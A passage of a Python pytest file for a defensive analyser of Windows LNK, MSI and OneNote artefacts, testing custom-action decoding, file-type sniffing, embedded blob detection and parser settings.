    assert W.decode_msi_stream_name(B.msi_stream_name(name, table)) == (name, table)


def test_decode_ca_type_and_resolve_formatted():
    ca = W.decode_ca_type(34 | 0x400 | 0x800)
    assert ca["action"] == "exe" and ca["deferred"] and ca["elevated"] and ca["executes"]
    assert W.decode_ca_type(38)["script_language"] == "vbscript" and W.decode_ca_type(51)["executes"] is False
    assert W.decode_ca_type(63)["action"] == "unknown" and W.decode_ca_type("38") is None and W.decode_ca_type(True) is None
    props = {"A": "[B]x", "B": "C:\\", "LOOP": "[LOOP]"}
    assert W.resolve_formatted("[A] [SystemFolder] [#file]", props) == "C:\\x [SystemFolder] [#file]"
    assert W.resolve_formatted("[LOOP]", props) == "[LOOP]" and W.resolve_formatted(None, props) is None


def test_sniff_kind_and_artefact_format(tmp_path):
    assert W.sniff_kind(B.build_lnk_ok())["kind"] == "lnk" and W.sniff_kind(B.build_msi_ok())["kind"] == "msi"
    assert W.sniff_kind(B.build_onenote_ok())["kind"] == "onenote"
    damaged = W.sniff_kind(B.build_lnk_bad_clsid(), "a.LNK")
    assert damaged == {"kind": "lnk", "by": "extension", "magic_ok": False, "extension": "lnk"}
    assert W.sniff_kind(b"text", "a.txt")["kind"] == "unknown"
    p = tmp_path / "x.msm"
    p.write_bytes(B.build_msi_malformed())
    assert W.artefact_format(str(p))[0] == "msi" and W.artefact_format(str(p))[2] == "extension"


def test_cfb_root_clsid_and_sniff_blob():
    assert W.cfb_root_clsid(B.build_msi_ok()) == "000c1084-0000-0000-c000-000000000046"
    assert W.cfb_root_clsid(b"\x00" * 600) is None
    assert W.sniff_blob(B.mz_stub()) == "pe" and W.sniff_blob(B.png_1x1()) == "png" and W.sniff_blob(B.HTA_LURE) == "hta"
    assert W.sniff_blob(B.JS_BINARY) == "js" and W.sniff_blob(B.APPENDED_VBS) == "vbs" and W.sniff_blob(b"") == "empty"
    assert W.sniff_blob("Write-Output 'a'".encode("utf-16-le")) == "ps1" and W.sniff_blob(bytes(range(256))) == "binary"


def test_use_extras_setting_keeps_to_the_builtin_readers(tmp_path):
    res = run(tmp_path, "a.lnk", B.build_lnk_ok(), settings=BUILTIN)
    assert res.attributes["lnk_shortcut"]["parser"] == "builtin MS-SHLLINK reader"
    rep = W.lnk_report(B.build_lnk_ok(), use_extras=False)
    assert rep["unavailable"].startswith("optional parsers disabled")
    assert W.msi_report(B.build_msi_ok(), use_extras=False)["tables_status"] == "disabled"
